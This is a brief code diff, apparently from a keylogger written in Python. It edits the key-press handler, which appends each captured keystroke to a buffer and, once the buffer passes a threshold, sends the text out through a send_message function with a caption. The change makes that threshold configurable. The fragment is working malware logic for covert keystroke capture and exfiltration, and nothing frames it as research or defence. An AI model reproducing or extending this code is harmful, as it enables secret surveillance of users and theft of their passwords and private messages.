@@ -118,7 +118,7 @@ def on_press(key):
         key_buffer += knew
     except :
         pass
-    if len(key_buffer) > 100:
+    if len(key_buffer) > int(config["main"]["keylimit"]):
         send_message(key_buffer+"\n\n"+caption)
         key_buffer = ""
 
